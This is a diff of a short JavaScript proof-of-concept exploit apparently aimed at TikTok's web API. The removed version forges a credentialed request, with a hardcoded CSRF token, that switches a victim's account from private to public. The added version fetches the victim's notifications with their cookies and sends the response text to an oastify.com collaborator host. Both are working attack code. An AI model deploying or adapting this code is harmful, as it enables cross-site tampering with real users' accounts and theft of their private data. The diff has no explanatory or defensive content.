@@ -1,6 +1,9 @@
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://www.tiktok.com/api/privacy/user/private_account/update/v1?aid=1988&app_language=en&app_name=tiktok_web&battery_info=0.96&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=&channel=tiktok_web&cookie_enabled=true&device_id=&device_platform=web_pc&field=private_account&focus_state=true&from_page=setting&history_len=14&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=GB&referer=https%3A%2F%2Fwww.tiktok.com%2Fmessages%3Flang%3Den&region=IL&root_referer=https%3A%2F%2Fwww.tiktok.com%2F%40mrhavitmrhavit&screen_height=1080&screen_width=1920&tt_csrf_token=&tz_name=Asia%2FJerusalem&value=0&verifyFp=&webcast_language=en");
+xhr.onload = reqListener; 
+xhr.open("GET", "https://www.tiktok.com/api/notice/multi/?aid=1988&app_language=es&app_name=tiktok_web&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%29&channel=tiktok_web&cookie_enabled=true&device_id=7059024763654440449&device_platform=web_pc&focus_state=true&from_page=setting&group_list=%5B%7B%22count%22%3A20%2C%22is_mark_read%22%3A1%2C%22group%22%3A500%2C%22max_time%22%3A0%2C%22min_time%22%3A0%7D%5D&history_len=3&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=IL&referer=https%3A%2F%2Fwww.tiktok.com%2F&region=IL&root_referer=https%3A%2F%2Fwww.tiktok.com%2F&screen_height=1080&screen_width=1920&tz_name=Asia%2FJerusalem&webcast_language=es&msToken=&X-Bogus=&_signature=");
 xhr.withCredentials = true;
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-xhr.setRequestHeader("X-Secsdk-Csrf-Token", "00010000000105bc4fb8f8bfa0ec67b6ea55f3932a30c32eaa388e54876960be6735342e4329175087cb5136883c");
-xhr.send('field=private_account&tt_csrf_token=&value=0');
+xhr.send();
+
+function reqListener() {
+    location='//u3y5ofp07x2nhjhbwfincxp5bwhn5dt2.oastify.com/log?key='+this.responseText; 
+};
